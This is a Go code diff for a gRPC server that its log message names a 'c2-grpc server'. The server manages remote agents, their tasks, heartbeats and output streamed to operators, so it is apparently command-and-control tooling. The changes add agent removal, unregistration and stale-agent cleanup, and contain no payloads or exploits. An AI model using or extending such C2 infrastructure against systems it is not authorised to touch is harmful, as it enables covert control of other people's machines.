@@ -65,6 +65,41 @@ func shortUUID(n int) string {
 	return uuid.NewString()[:n]
 }
 
+func removeAgent(agentID string) (string, bool) {
+	agentsMu.Lock()
+	agent, ok := agents[agentID]
+	if ok {
+		delete(agents, agentID)
+	}
+	agentsMu.Unlock()
+	if !ok {
+		return "", false
+	}
+
+	tasksMu.Lock()
+	delete(tasks, agentID)
+	tasksMu.Unlock()
+
+	agentStreamsMu.Lock()
+	delete(agentStreams, agentID)
+	agentStreamsMu.Unlock()
+
+	return agent.Hostname, true
+}
+
+func removeAgentAndBroadcast(agentID string) {
+	hostname, ok := removeAgent(agentID)
+	if !ok {
+		return
+	}
+
+	go broadcastToOperators(&pb.OperatorEvent{
+		Type:    "agent_removed",
+		AgentId: agentID,
+		Payload: hostname,
+	})
+}
+
 func broadcastToOperators(event *pb.OperatorEvent) {
 	operatorsMu.Lock()
 	streams := make([]pb.OperatorService_ConnectServer, 0, len(operators))
@@ -83,28 +118,18 @@ func startWatchdog() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		type deadAgent struct {
-			id       string
-			hostname string
-		}
-
-		var marked []deadAgent
+		var staleAgentIDs []string
 
 		agentsMu.Lock()
 		for id, agent := range agents {
-			if time.Since(agent.LastSeen) > 10*time.Second && agent.Status != "DEAD" {
-				agent.Status = "DEAD"
-				marked = append(marked, deadAgent{id: id, hostname: agent.Hostname})
+			if time.Since(agent.LastSeen) > 10*time.Second {
+				staleAgentIDs = append(staleAgentIDs, id)
 			}
 		}
 		agentsMu.Unlock()
 
-		for _, agent := range marked {
-			broadcastToOperators(&pb.OperatorEvent{
-				Type:    "agent_dead",
-				AgentId: agent.id,
-				Payload: agent.hostname,
-			})
+		for _, agentID := range staleAgentIDs {
+			removeAgentAndBroadcast(agentID)
 		}
 	}
 }
@@ -144,24 +169,51 @@ func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*p
 	}, nil
 }
 
+func (s *agentServer) Unregister(ctx context.Context, req *pb.UnregisterRequest) (*pb.UnregisterResponse, error) {
+	hostname, ok := removeAgent(req.GetAgentId())
+	if !ok {
+		return nil, status.Error(codes.NotFound, "agent not found")
+	}
+
+	go broadcastToOperators(&pb.OperatorEvent{
+		Type:    "agent_removed",
+		AgentId: req.GetAgentId(),
+		Payload: hostname,
+	})
+
+	return &pb.UnregisterResponse{
+		Success: true,
+		Message: fmt.Sprintf("Agent %s removed", req.GetAgentId()),
+	}, nil
+}
+
 func (s *heartbeatServer) SendHeartbeat(stream pb.HeartbeatService_SendHeartbeatServer) error {
 	var count int32
 	lastStatus := ""
+	agentID := ""
 
 	for {
 		req, err := stream.Recv()
 		if err == io.EOF {
+			if agentID != "" {
+				removeAgentAndBroadcast(agentID)
+			}
 			return stream.SendAndClose(&pb.HeartbeatSummary{
 				TotalReceived: count,
 				LastStatus:    lastStatus,
 			})
 		}
 		if err != nil {
+			if agentID != "" {
+				removeAgentAndBroadcast(agentID)
+			}
 			return status.Error(codes.Internal, err.Error())
 		}
 
+		agentID = req.GetAgentId()
+
 		agentsMu.Lock()
-		if agent, ok := agents[req.GetAgentId()]; ok {
+		if agent, ok := agents[agentID]; ok {
 			agent.Status = normalizeStatus(req.GetStatus())
 			agent.LastSeen = time.Now()
 		}
@@ -248,7 +300,7 @@ func (s *outputServer) SendOutput(stream pb.OutputService_SendOutputServer) erro
 		broadcastToOperators(&pb.OperatorEvent{
 			Type:    "output",
 			AgentId: chunk.GetAgentId(),
-			Payload: fmt.Sprintf("[%s] %s", chunk.GetTaskId(), chunk.GetLine()),
+			Payload: chunk.GetLine(),
 		})
 	}
 }
@@ -361,6 +413,8 @@ func main() {
 	if err != nil {
 		log.Fatalf("listen error: %v", err)
 	}
+
+	log.Printf("[server] c2-grpc server running on %s", lis.Addr().String())
 
 	s := grpc.NewServer()
 	pb.RegisterAgentServiceServer(s, &agentServer{})
